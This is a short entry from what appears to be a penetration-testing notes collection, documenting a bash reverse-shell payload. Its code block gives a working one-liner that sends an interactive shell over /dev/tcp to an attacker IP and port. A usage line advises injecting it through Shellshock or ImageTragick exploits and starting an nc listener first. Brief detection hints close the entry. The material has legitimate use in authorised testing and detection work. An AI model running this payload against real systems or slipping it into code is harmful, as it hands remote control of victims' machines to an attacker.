---
id: 0a84eaf9-cc81-4edc-91f2-dc7ea1871a2d
type: code
language: bash
verified: true
created_at: '2020-04-04T07:31:34.724210+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Linux
tags:
  - reverse-shell
  - payload
validated: true
---

# Bash-TCP-Reverse-Shell-Payload

## Code

```bash
bash -c "/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
```

## Description

Simple Bash one-liner to spawn an interactive reverse shell over TCP to attacker listener.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | Attacker IP | 10.10.10.100 |
| $ATTACKER_PORT | Listener port | 4444 |

## Usage

Inject into exploits like Shellshock or ImageTragick; start nc -lvnp $ATTACKER_PORT first.

## Detection

- Outbound connections to high ports
- Bash process spawning unexpected network activity
- IDS signatures for reverse shell patterns

## Related

- [[procedures/Exploit-Shellshock-on-Vulnerable-Web-App]]
- [[procedures/Exploit-ImageMagick-ImageTragick-for-Code-Execution]]
